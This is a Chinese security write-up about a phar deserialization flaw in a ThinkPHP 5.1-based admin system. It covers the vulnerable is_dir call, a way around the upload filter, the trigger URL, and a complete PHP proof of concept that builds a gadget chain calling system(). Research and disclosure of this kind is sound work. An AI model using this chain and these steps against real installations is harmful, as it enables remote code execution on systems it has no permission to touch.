前言
--

前端时间学习了下phar反序列化的原理，想着找个通用系统挖挖看，运气好捡到一个，便有此文记录一下捡漏过程。

前置知识
----

可以认为Phar是PHP的压缩文档。从`PHP 5.3`开始，引入了类似于JAR的一种打包文件机制。它可以把多个文件存放至同一个文件中，无需解压，PHP就可以进行访问并执行内部语句。

Phar之所以能触发反序列化，是因为Phar文件会以序列化的形式存储用户自定义的`meta-data`。而PHP在解析meta数据时，会调用`php_var_unserialize`进行反序列化操作。

常见的可以触发Phar反序列化的PHP文件系统函数如下

![image-20240624171754510](https://shs3.b.qianxin.com/butian_public/f204219f3a2e0ec559e94d291f9a4525b1dba6e519620.jpg)

寻找目标
----

由于光有反序列化触发点还是无法证明存在反序列化漏洞，还需要配合利用链才完整，加上目标网上已经有公开的链可以打，比如

[ThinkPHP5.1反序列化漏洞实现rce](https://forum.butian.net/share/2307)，所以尝试寻找使用tp5.1二开的项目来审计挖掘。

审计过程
----

github上搜寻符合我们要求的框架，下载后全局搜索诸如is\_file、is\_dir等可能存在漏洞的函数且参数可控的地方，找到这么一处

![image-20240624173019354](https://shs3.b.qianxin.com/butian_public/f8312671ddc7232c0a6b937994baa3740bc0183deb08d.jpg)

在 /application/admin/controller/Database.php 中有一个is\_dir判断，而该函数可以触发phar反序列化，由于是使用tp5.1的项目，只要上传一个tp5.1序列化的phar文件，然后控制数据库备份路径为该phar文件即可。

漏洞功能点如下

![image-20240702152111275](https://shs3.b.qianxin.com/butian_public/f260421cca8d5963310c69d6ecf39f6776d6069a011c7.jpg)

在后台系统设置-数据库 中可以设置数据库备份根路径，那么只要将此处设置为上传的phar文件的路径即可。

漏洞点位于后台，自己环境登录后，寻找上传点上传

POST /admin.php/admin/attachment/upload/dir/images/module/admin.html HTTP/1.1

![image-20240702152027146](https://shs3.b.qianxin.com/butian_public/f170116320a1d69c45827ccbff503fb2585ea384cbc31.jpg)

尝试后台的几个上传功能都失败了，分析下源码，通过调用/admin/目录下的attachment.php中的upload方法进行上传，上传接口的/dir/images/module/admin.html，分别对应dir→images, module→admin.html

![image-20240624182259243](https://shs3.b.qianxin.com/butian_public/f84172399793bbe3cd4052e03a6d738bc3dad262ad796.jpg)

发现都是通过调用savefile函数

![image-20240624182342336](https://shs3.b.qianxin.com/butian_public/f3852266bc3cf4f763b0a798e7ea3d1348730cd577893.jpg)

![image-20240624182409923](https://shs3.b.qianxin.com/butian_public/f661575a3c1cb537771ed4511f03c5aa6e2aca69169f9.jpg)

限制了文件mime、后缀名等，好在PHP在识别Phar文件时，是通过其文件头部标识`__HALT_COMPILER();?>`，并且对头部标识前面的内容或后缀名没有严格要求的。  
因此可以通过添加任意的文件头并修改Phar文件后缀名的方式，将Phar文件伪装成其他格式的文件，从而绕过上传点限制。

通过如下poc生成phar文件，上传时修改为任意后缀即可

```php
<?php

namespace think\process\pipes {
    class Windows
    {
        private $files;
        public function __construct($files)
        {
            $this->files = [$files];
        }
    }
}
namespace think\model\concern {
    trait Conversion
    {    
    }
    trait Attribute
    {
        private $data;
        private $withAttr = ["lin" => "system"];
        public function get()
        {
            $this->data = ["lin" => "dir"];
        }
    }
}
namespace think {
    abstract class Model
    {
        use model\concern\Attribute;
        use model\concern\Conversion;
    }
}
namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
        public function __construct()
        {
            $this->get();
        }
    }
}
namespace {
    $conver = new think\model\Pivot();
    $payload = new think\process\pipes\Windows($conver);
    @unlink("phar.phar");
    $phar=new Phar("phar.phar");
    $phar->startBuffering(); 
    $phar->setStub('GIF89a'."<?php __HALT_COMPILER(); ?>"); 
    $phar->setMetadata($payload); 
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();
    echo urlencode(serialize($payload));
}
?>

```

结果还是不行

![image-20240702151842040](https://shs3.b.qianxin.com/butian_public/f752010cf9bf53e6efb55abfb651b4161dd8d62ef4516.jpg)

源码里也并未发现别的过滤，转向看返回的报错信息

![image-20240702153108383](https://shs3.b.qianxin.com/butian_public/f3201627e8a7026f041a72017170055b38abaad5cf1ef.jpg)

不知道在哪儿调用了这个vendor\\topthink\\think-image\\src\\Image.php,校验了图像信息，导致上传失败

返回去搜这个$info变量，发现原来是再上传后移动文件时调用了这个检测图片正确性的代码，导致抛出异常上传不了

![image-20240702154954826](https://shs3.b.qianxin.com/butian_public/f661589bea2a52a2f29111eb997c29996d4c7512218c7.jpg)

![image-20240702155046989](https://shs3.b.qianxin.com/butian_public/f896478b4aec27de47bad2640f327e90853df877c41d0.jpg)

可以看到当dir=images时，就会向下执行\\vendor\\topthink\\think-image\\src\\Image.php中的图像正确性校验函数，导致上传失败。

因此，只能转向搜索其他上传点

![image-20240702160143739](https://shs3.b.qianxin.com/butian_public/f103014f66ed69df00813648e288aa1e7f4cc2f83a409.jpg)

发现一处通过ueditor上传附件的地方，且也是通过savefile函数去调用的

因此将原先的上传接口中的dir参数改为files即/admin.php/admin/attachment/upload/dir/files/module/admin.html即可（文件后缀也改成附件类型的zip、docx等等）

![image-20240702160316884](https://shs3.b.qianxin.com/butian_public/f996276597d3b2deb76b731157906bec2eb9d97b4d4fd.jpg)

回到后台把数据库备份路径改成上传的恶意文件地址

![image-20240702160440054](https://shs3.b.qianxin.com/butian_public/f615645a6aad67b5ae39d5b63defb4bc839060349b202.jpg)

保存后再访问调用了目标is\_dir（）函数的地址例如admin.php/admin/database/index/group/import.html，即可触发执行了poc中的dir命令

![image-20240702160743968](https://shs3.b.qianxin.com/butian_public/f614257f230fd571c10e28dc5313de6b614f09bda606c.jpg)